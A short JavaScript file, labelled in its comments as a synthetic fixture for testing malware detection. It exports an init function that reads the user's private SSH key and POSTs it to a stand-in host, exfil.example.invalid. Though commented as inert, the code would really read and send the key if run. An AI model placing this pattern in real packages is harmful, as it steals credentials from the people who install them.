// FIXTURE ONLY — synthetic detection test sample, not real malware
// Inert sample: loaded by the package main; reads an SSH key and sends it off the machine.
const fs = require("fs");
const https = require("https");

module.exports = function init() {
  const key = fs.readFileSync(process.env.HOME + "/.ssh/id_rsa", "utf8");
  https.request("https://exfil.example.invalid/k", { method: "POST" }).end(key);
};
